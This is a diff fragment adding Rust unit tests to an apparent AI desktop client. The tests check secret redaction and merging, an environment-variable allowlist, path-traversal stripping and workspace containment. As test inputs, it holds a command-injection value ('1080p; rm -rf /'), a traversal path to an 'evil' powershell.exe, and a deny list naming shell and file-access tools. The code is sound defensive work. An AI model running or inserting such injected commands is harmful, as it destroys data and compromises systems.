+        assert!(merged.contains("sk-prod-real"));
+        assert!(!merged.contains("local-key"));
+    }
+
+    #[test]
+    fn merge_config_secrets_fails_when_table_missing_on_disk() {
+        let existing = r#"
+[model.foo]
+api_key = "sk-foo"
+"#;
+        let incoming = r#"
+[model.bar]
+api_key = "********"
+"#;
+        let err = merge_config_secrets_from_existing(existing, incoming).unwrap_err();
+        assert!(err.contains("model.bar") || err.contains("无法安全恢复"));
+    }
+
+    #[test]
+    fn toml_table_header_tolerates_trailing_comment() {
+        assert!(is_toml_table_header(r#"[model.foo] # prod"#));
+        assert_eq!(
+            toml_table_header_key(r#"[model."grok-4.5"] # x"#).as_deref(),
+            Some(r#"[model."grok-4.5"]"#)
+        );
+        let existing = r#"
+[model.foo] # local
+api_key = "sk-commented-header"
+"#;
+        let incoming = r#"
+[model.foo] # local
+api_key = "********"
+"#;
+        let merged = merge_config_secrets_from_existing(existing, incoming).expect("merge");
+        assert!(merged.contains("sk-commented-header"));
+    }
+
+    #[test]
+    fn redact_secret_for_export_masks_keys() {
+        assert_eq!(redact_secret_for_export(""), "");
+        assert_eq!(redact_secret_for_export("short"), "********");
+        let redacted = redact_secret_for_export("sk-abcdefghijklmnopqrstuvwxyz");
+        assert!(redacted.starts_with("sk-a"));
+        assert!(!redacted.contains("bcdefghijklmnop"));
+        assert_eq!(
+            redact_secret_for_export("enc:v1:AAAA"),
+            "[dpapi-sealed]"
+        );
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn system32_tool_uses_windows_dir_and_strips_path() {
+        let path = system32_tool(r"..\..\evil\powershell.exe");
+        let s = path.to_string_lossy();
+        assert!(s.ends_with("powershell.exe") || s.ends_with("powershell.EXE"));
+        assert!(s.contains("System32") || s.contains("system32"));
+        assert!(!s.contains("evil"));
+        let bare = system32_tool("rundll32.exe");
+        assert!(bare
+            .file_name()
+            .and_then(|n| n.to_str())
+            .is_some_and(|n| n.eq_ignore_ascii_case("rundll32.exe")));
+    }
+
+    #[test]
+    fn export_support_diagnostics_redacts_and_omits_env_secrets() {
+        let dump = export_support_diagnostics().expect("diagnostics");
+        assert!(dump.contains("clientVersion"));
+        assert!(dump.contains("providers"));
+        assert!(dump.contains("notes"));
+        // Must never dump full env secret material.
+        assert!(!dump.contains("XAI_API_KEY="));
+        // Redaction markers acceptable; raw long sk- keys should not appear if sealed.
+        if dump.contains("sk-") {
+            // If a short redacted prefix leaks, body must still use ellipsis form.
+            assert!(dump.contains('…') || dump.contains("[dpapi-sealed]") || dump.contains("********"));
+        }
+    }
+
+    #[test]
+    fn secret_seal_roundtrip_or_plaintext_fallback() {
+        let plain = "sk-test-key-for-seal-roundtrip-01";
+        let stored = seal_secret_for_storage(plain).expect("seal");
+        let opened = unseal_secret_from_storage(&stored).expect("unseal");
+        assert_eq!(opened, plain);
+        // Legacy plaintext still opens.
+        assert_eq!(
+            unseal_secret_from_storage(plain).expect("legacy"),
+            plain
+        );
+    }
+
+    #[test]
+    fn cli_env_allowlist_only_provider_and_locale_keys() {
+        assert!(is_allowed_cli_env_key("XAI_API_KEY"));
+        assert!(is_allowed_cli_env_key("GROK_MODELS_BASE_URL"));
+        assert!(is_allowed_cli_env_key("OPENAI_API_KEY"));
+        assert!(is_allowed_cli_env_key("TERM"));
+        assert!(is_allowed_cli_env_key("LANG"));
+        // Random secrets / tooling from a polluted .env must not pass.
+        assert!(!is_allowed_cli_env_key("AWS_SECRET_ACCESS_KEY"));
+        assert!(!is_allowed_cli_env_key("DATABASE_URL"));
+        assert!(!is_allowed_cli_env_key("MY_CUSTOM_TOKEN"));
+        // Denylist always wins even if a prefix looks provider-like.
+        assert!(!is_allowed_cli_env_key("PATH"));
+        assert!(!is_allowed_cli_env_key("HTTP_PROXY"));
+        assert!(!is_allowed_cli_env_key("NODE_OPTIONS"));
+        // Host identity must not be rewritten from .env.
+        assert!(!is_allowed_cli_env_key("HOME"));
+        assert!(!is_allowed_cli_env_key("USERPROFILE"));
+        // Telemetry/analytics must not be re-enabled from a polluted .env
+        // (desktop injects GROX_PRIVACY_ENV last).
+        assert!(!is_allowed_cli_env_key("GROK_TELEMETRY_ENABLED"));
+        assert!(!is_allowed_cli_env_key("OTEL_TRACES_EXPORTER"));
+        assert!(!is_allowed_cli_env_key("XAI_TELEMETRY_ENABLED"));
+        assert!(is_telemetry_or_analytics_env_key("GROK_TELEMETRY_ENABLED"));
+    }
+
+    #[test]
+    fn prompt_image_stays_inside_workspace() {
+        let stamp = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_millis())
+            .unwrap_or(0);
+        let workspace = std::env::temp_dir().join(format!("grox-img-ws-{stamp}"));
+        fs::create_dir_all(&workspace).unwrap();
+        let inside = workspace.join("ok.png");
+        // Minimal PNG header is enough for size checks; mime may fail — write real-ish bytes.
+        // 1x1 PNG
+        let png = [
+            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48,
+            0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x00, 0x00,
+            0x00, 0x90, 0x77, 0x53, 0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41, 0x54, 0x08,
+            0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
+            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82,
+        ];
+        fs::write(&inside, png).unwrap();
+        let ws = workspace.canonicalize().unwrap();
+        assert!(checked_explicit_prompt_image(&ws, "ok.png").is_ok());
+        let outside = std::env::temp_dir().join(format!("grox-img-out-{stamp}.png"));
+        fs::write(&outside, png).unwrap();
+        let outside_s = outside.to_string_lossy().to_string();
+        let err = checked_explicit_prompt_image(&ws, &outside_s).unwrap_err();
+        assert!(
+            err.contains("只能附加当前项目内"),
+            "expected workspace containment, got {err}"
+        );
+        let _ = fs::remove_file(&inside);
+        let _ = fs::remove_file(&outside);
+        let _ = fs::remove_dir_all(&workspace);
+    }
+
+    #[test]
+    fn media_generation_tools_are_media_only_constant() {
+        // Always-approve is only safe while this list stays media-scoped.
+        let tools: Vec<&str> = MEDIA_GENERATION_TOOLS.split(',').collect();
+        assert_eq!(
+            tools,
+            vec![
+                "image_gen",
+                "video_gen",
+                "image_to_video",
+                "reference_to_video"
+            ]
+        );
+        for forbidden in ["bash", "shell", "computer", "read_file", "write"] {
+            assert!(
+                !tools.iter().any(|t| *t == forbidden || t.contains(forbidden)),
+                "media tools must not include {forbidden}"
+            );
+        }
+    }
+
+    #[test]
+    fn media_resolution_tokens_are_allowlisted_shape() {
+        for ok in ["480p", "720p", "1080p", "4k", "4K"] {
+            assert!(
+                matches!(ok, "480p" | "720p" | "1080p" | "4k" | "4K"),
+                "{ok}"
+            );
+        }
+        for bad in ["1080p; rm -rf /", "4k\ninject", "ultra"] {
+            assert!(
+                !matches!(bad.trim(), "480p" | "720p" | "1080p" | "4k" | "4K"),
+                "{bad}"
+            );
+        }
     }
 
     #[test]
